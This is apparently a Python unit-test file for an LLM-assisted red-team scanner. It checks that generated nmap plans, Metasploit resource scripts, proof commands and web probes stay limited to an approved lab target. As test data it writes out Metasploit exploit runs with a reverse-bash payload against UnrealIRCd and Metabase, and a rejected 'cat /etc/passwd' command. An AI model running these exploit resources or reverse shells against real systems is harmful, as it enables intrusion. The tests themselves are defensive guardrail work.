from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from medflow_graph.memory import GraphStore
from medflow_redteam.campaign import http_ports_from_scan, http_ports_from_services, observation_status
from medflow_redteam.capabilities import capability_match_score, select_capabilities_for_services
from medflow_redteam.command_planner import (
    fallback_metasploit_resource,
    fallback_nmap_plan,
    fallback_proof_command,
    fallback_recon_strategy,
    fallback_validation_strategy,
    validate_recon_strategy,
    validate_metasploit_resource,
    validate_nmap_argv,
    validate_proof_command,
    validate_validation_strategy,
)
from medflow_redteam.generated_tools import load_generated_tool_specs, resolve_generated_tool_code, validate_generated_tool_code
from medflow_redteam.identity import analyze_identity_logs
from medflow_redteam.metasploit_runner import first_interesting_line, has_command_output_proof, payload_attempts
from medflow_redteam.tools import normalize_validation_status, route_technology_signals, web_control_checks
from medflow_redteam.web_app import (
    WebAuthContext,
    WebParam,
    WebRoute,
    build_request,
    classify_parameter,
    extract_client_routes,
    extract_robots_routes,
    redact_auth_context,
    response_signals,
    run_idor_confirmation,
    persist_web_observation_graph,
    run_safe_web_probes,
)
from medflow_redteam.web_kb import load_seed_documents


class RedTeamCoreTests(unittest.TestCase):
    def test_validation_statuses_are_explicit(self) -> None:
        self.assertEqual(
            normalize_validation_status({"allowed": False, "verified": False}),
            "blocked_by_safety_policy",
        )
        self.assertEqual(
            normalize_validation_status({"allowed": True, "verified": True}, {"runner": "generated_python_tool"}),
            "confirmed_exposure",
        )
        self.assertEqual(
            normalize_validation_status({"allowed": True, "verified": False, "reason": "no finding"}),
            "ran_no_finding",
        )

    def test_graph_review_confirm_tombstones_duplicate(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            store = GraphStore(Path(tmp) / "graph.json")
            first = store.upsert_node("Finding", "Packet Capture Exposure", context="download 0 pcap", stable_key="finding-a").node
            second = store.upsert_node("Finding", "Packet Capture Exposure", context="download 1 pcap", stable_key="finding-b").node
            store.add_review(second.id, first.id, 0.9, "test duplicate")
            review_id = store.pending_reviews()[0].id
            store.apply_review(review_id, "confirm")
            self.assertEqual(store.reviews[review_id].status, "confirmed")
            self.assertEqual(store.nodes[second.id].status, "tombstoned")

    def test_identity_log_mfa_fatigue_signal(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "events.json"
            events = [
                {"user": "alice@example.test", "event": "MFA push denied"}
                for _ in range(5)
            ]
            path.write_text(json.dumps(events), encoding="utf-8")
            result = analyze_identity_logs(path)
            self.assertEqual(result["findings"][0]["type"], "mfa_fatigue_signal")

    def test_web_evidence_boosts_only_web_matches(self) -> None:
        web_routes = {"web_routes": [{"url": "http://lab/download/1", "artifact_signal": "possible packet capture exposure"}]}
        http_capability = {
            "id": "http_header",
            "runner": "nmap_nse_script",
            "provider": "inventory",
            "match": {"service": "http", "ports": ["80"], "product_keywords": ["http"]},
        }
        ftp_capability = {
            "id": "ftp_check",
            "runner": "nmap_nse_script",
            "provider": "inventory",
            "match": {"service": "ftp", "ports": ["21"], "product_keywords": ["ftp"]},
        }
        http_score, http_reasons = capability_match_score(
            http_capability,
            {"service": "http", "port": "80", "version": "Gunicorn"},
            web_routes=web_routes,
        )
        ftp_score, ftp_reasons = capability_match_score(
            ftp_capability,
            {"service": "ftp", "port": "21", "version": "vsftpd"},
            web_routes=web_routes,
        )
        self.assertGreater(http_score, ftp_score)
        self.assertIn("web artifact signal observed", http_reasons)
        self.assertNotIn("web artifact signal observed", ftp_reasons)

    def test_web_control_checks_from_observations(self) -> None:
        result = web_control_checks(
            {"web_routes": [{"url": "http://lab/download/1", "content_type": "application/vnd.tcpdump.pcap", "artifact_signal": "possible packet capture exposure"}]},
            {"web_fingerprints": [{"url": "http://lab/", "security_headers": {"content_security_policy": False}}]},
        )
        self.assertGreaterEqual(result["count"], 2)

    def test_spa_routes_do_not_create_framework_false_positives(self) -> None:
        signals = route_technology_signals(
            "http://lab:3000/functionRouter",
            "Metabase",
            "<html><title>Metabase</title><script src='/app.js'></script></html>",
            200,
        )
        self.assertIn("metabase", signals)
        self.assertNotIn("spring", signals)
        self.assertNotIn("struts", signals)

    def test_web_app_graph_and_safe_probes(self) -> None:
        route = WebRoute(
            url="http://172.29.10.10:8080/item?id=1&q=test",
            status=200,
            title="Search",
            params=[
                WebParam("id", "query", "1", classify_parameter("id", "1")),
                WebParam("q", "query", "test", classify_parameter("q", "test")),
            ],
        )
        self.assertIn("object_id", route.params[0].classifications)
        self.assertIn("sql_like", route.params[0].classifications)
        self.assertIn("reflected_input", route.params[1].classifications)

        def fake_fetch(url: str, auth_context: WebAuthContext | None = None) -> dict:
            if "MEDFLOW_XSS_MARKER" in url:
                return {"ok": True, "body": f"<html>{url}</html>"}
            if "%27" in url or "'" in url:
                return {"ok": True, "body": "SQL syntax error near quote MySQL"}
            return {"ok": True, "body": "<html>baseline</html>"}

        with patch("medflow_redteam.web_app.fetch_text", side_effect=fake_fetch):
            findings = run_safe_web_probes([route])
        finding_types = {finding.type for finding in findings}
        self.assertIn("sqli_error_signal", finding_types)
        self.assertIn("xss_reflection_signal", finding_types)
        self.assertIn("idor_candidate", finding_types)

        with tempfile.TemporaryDirectory() as tmp:
            graph = persist_web_observation_graph("172.29.10.10", [8080], [route], findings, Path(tmp) / "web_graph.json")
            summary = graph.summary()
            self.assertGreaterEqual(summary.get("nodes_route", 0), 1)
            self.assertGreaterEqual(summary.get("nodes_parameter", 0), 2)
            self.assertGreaterEqual(summary.get("nodes_finding", 0), 3)

    def test_web_appsec_seed_documents_load(self) -> None:
        docs = load_seed_documents()
        collections = {doc.collection for doc in docs}
        self.assertIn("web_methodology_db", collections)
        self.assertIn("web_payload_db", collections)
        self.assertTrue(any("SQL injection" in doc.text for doc in docs))

    def test_spa_and_robots_route_discovery(self) -> None:
        routes = extract_client_routes(
            "const a=`${host}/rest/products/search?q=${e}`; const b=\"/api/Products\"; const ignored='/assets/app.js';"
        )
        self.assertIn("/rest/products/search?q=", routes)
        self.assertIn("/api/Products", routes)
        self.assertNotIn("/assets/app.js", routes)
        self.assertEqual(extract_robots_routes("User-agent: *\nDisallow: /ftp\nAllow: /public\n"), ["/ftp", "/public"])

    def test_json_response_facts_are_value_free(self) -> None:
        signals = response_signals('{"data": [{"email": "redacted@example.test", "password": "not-retained", "totpSecret": "not-retained"}]}', "application/json")
        self.assertEqual(signals, ["data", "email", "password", "totpsecret"])

    def test_idor_confirmation_requires_declared_owner_and_redacts_secrets(self) -> None:
        route = WebRoute(
            url="http://172.29.10.10:8080/api/records/101",
            status=200,
            params=[WebParam("path_segment", "path", "101", ["object_id"])],
        )
        owner = WebAuthContext(
            name="alice",
            headers={"Authorization": "Bearer alice-secret"},
            cookies={"session": "alice-cookie"},
            owned_object_ids=["101"],
        )
        alternate = WebAuthContext(name="bob", headers={"Authorization": "Bearer bob-secret"})

        def fake_fetch(url: str, auth_context: WebAuthContext | None = None) -> dict:
            if auth_context and auth_context.name in {"alice", "bob"}:
                return {"ok": True, "status": 200, "body": "record 101 owner alice diagnosis demo"}
            return {"ok": False}

        with patch("medflow_redteam.web_app.fetch_text", side_effect=fake_fetch):
            findings = run_idor_confirmation([route], owner, alternate)
        self.assertEqual(findings[0].type, "idor_confirmed")
        self.assertEqual(findings[0].status, "confirmed_vulnerability")

        redacted = redact_auth_context(owner)
        self.assertEqual(redacted["header_names"], ["Authorization"])
        self.assertEqual(redacted["cookie_names"], ["session"])
        self.assertNotIn("alice-secret", json.dumps(redacted))
        self.assertEqual(build_request("http://lab/", owner).get_header("Cookie"), "session=alice-cookie")

        no_owner = WebAuthContext(name="alice", headers=owner.headers)
        with patch("medflow_redteam.web_app.fetch_text", side_effect=fake_fetch):
            self.assertEqual(run_idor_confirmation([route], no_owner, alternate), [])

    def test_generated_tool_specs_from_dynamic_cache_are_valid(self) -> None:
        specs = load_generated_tool_specs()
        for item in specs:
            validation = validate_generated_tool_code(resolve_generated_tool_code(item))
            self.assertTrue(validation.ok, validation.errors)
        if specs:
            spec = specs[0]
            match = spec.get("match") or {}
            ports = match.get("ports") or ["1"]
            selected = select_capabilities_for_services(
                "172.29.10.10",
                [
                    {
                        "port": str(ports[0]),
                        "service": str(match.get("service") or "unknown"),
                        "version": " ".join(match.get("product_keywords") or []),
                    }
                ],
                limit=1,
            )
            self.assertEqual(selected["selected_candidates"][0]["runner"], "generated_python_tool")

    def test_observation_status_does_not_call_errors_success(self) -> None:
        self.assertEqual(
            observation_status({"http_probe": [{"url": "http://lab/", "error": "connection refused"}]}, "http_probe"),
            "ran_no_finding",
        )
        self.assertEqual(
            observation_status({"http_probe": [{"url": "http://lab/", "status": 200}, {"url": "http://lab/admin", "error": "404"}]}, "http_probe"),
            "partial_success",
        )

    def test_http_ports_only_from_http_like_services(self) -> None:
        self.assertEqual(
            http_ports_from_services(
                [
                    {"port": "21", "service": "ftp", "version": "ProFTPD"},
                    {"port": "6667", "service": "irc", "version": "UnrealIRCd"},
                ]
            ),
            [],
        )
        self.assertEqual(http_ports_from_services([{"port": "8180", "service": "http", "version": "Jetty"}]), [8180])
        self.assertEqual(http_ports_from_scan("3000/tcp open ppp?\nHTTP/1.1 200 OK\nContent-Type: text/html", [3000]), [3000])
        self.assertEqual(http_ports_from_scan("3000/tcp open ppp?", [3000]), [])

    def test_dynamic_command_plans_are_constrained(self) -> None:
        nmap_plan = fallback_nmap_plan("172.29.10.10", [21, 22])
        self.assertEqual(validate_nmap_argv(nmap_plan["argv"], "172.29.10.10", [21, 22]), nmap_plan["argv"])
        with self.assertRaises(ValueError):
            validate_nmap_argv(["nmap", "--script", "vuln", "-p", "21,22", "172.29.10.10"], "172.29.10.10", [21, 22])

        msf_plan = fallback_metasploit_resource(
            "172.29.10.10",
            "exploit/unix/irc/unreal_ircd_3281_backdoor",
            {"RPORT": "6667"},
            "cmd/unix/generic",
            "exploit",
        )
        self.assertEqual(
            validate_metasploit_resource(
                msf_plan["resource_lines"],
                "172.29.10.10",
                "exploit/unix/irc/unreal_ircd_3281_backdoor",
                "exploit",
            ),
            msf_plan["resource_lines"],
        )
        self.assertEqual(
            validate_metasploit_resource(
                [
                    "use exploit/linux/http/metabase_setup_token_rce",
                    "set RHOSTS 172.29.10.10",
                    "set RPORT 3000",
                    "set SSL false",
                    "set TARGETURI /",
                    "set VHOST lab.local",
                    "set PAYLOAD cmd/unix/reverse_bash",
                    "run -j",
                    "sleep 12",
                    "sessions -l",
                    "sessions -K",
                    "exit -y",
                ],
                "172.29.10.10",
                "exploit/linux/http/metabase_setup_token_rce",
                "exploit",
            ),
            [
                "use exploit/linux/http/metabase_setup_token_rce",
                "set RHOSTS 172.29.10.10",
                "set RPORT 3000",
                "set SSL false",
                "set TARGETURI /",
                "set VHOST lab.local",
                "set PAYLOAD cmd/unix/reverse_bash",
                "run -j",
                "sleep 12",
                "sessions -l",
                "sessions -K",
                "exit -y",
            ],
        )
        with self.assertRaises(ValueError):
            validate_metasploit_resource(
                ["use exploit/unix/irc/unreal_ircd_3281_backdoor", "set RHOSTS 8.8.8.8", "check", "exit -y"],
                "172.29.10.10",
                "exploit/unix/irc/unreal_ircd_3281_backdoor",
                "check",
            )
        with self.assertRaises(ValueError):
            validate_metasploit_resource(
                [
                    "use exploit/linux/http/metabase_setup_token_rce",
                    "set RHOSTS 172.29.10.10",
                    "set CMD cat /etc/passwd",
                    "run -j",
                    "sessions -l",
                    "sessions -K",
                    "exit -y",
                ],
                "172.29.10.10",
                "exploit/linux/http/metabase_setup_token_rce",
                "exploit",
            )

    def test_rce_proof_commands_are_constrained_and_prioritized(self) -> None:
        self.assertEqual(fallback_proof_command()["command"], "id")
        self.assertEqual(validate_proof_command(" uname   -a "), "uname -a")
        with self.assertRaises(ValueError):
            validate_proof_command("cat /etc/passwd")

        payloads = payload_attempts(
            {
                "selected_payload": "cmd/unix/reverse_bash",
                "payload_candidates": [
                    {"payload": "cmd/unix/reverse_bash"},
                    {"payload": "cmd/unix/generic"},
                ],
            }
        )
        self.assertEqual(payloads[0], "cmd/unix/generic")

        output = "random\nuid=1000(app) gid=1000(app) groups=1000(app)\n"
        self.assertTrue(has_command_output_proof(output, "id"))
        self.assertEqual(first_interesting_line(output, "id"), "uid=1000(app) gid=1000(app) groups=1000(app)")

    def test_llm_strategy_outputs_are_constrained(self) -> None:
        recon = validate_recon_strategy(
            {"service_scan_ports": [22, 80, 9999, "bad"], "http_probe_ports": [80, 9999], "validation_focus": ["web first"]},
            [22, 80],
            fallback_recon_strategy([22, 80]),
        )
        self.assertEqual(recon["service_scan_ports"], [22, 80])
        self.assertEqual(recon["http_probe_ports"], [80])

        candidates = [{"id": "a"}, {"id": "b"}]
        strategy = validate_validation_strategy(
            {"selected_ids": ["b", "unknown", "a"]},
            candidates,
            2,
            fallback_validation_strategy(candidates, 2),
        )
        self.assertEqual(strategy["selected_ids"], ["b", "a"])


if __name__ == "__main__":
    unittest.main()
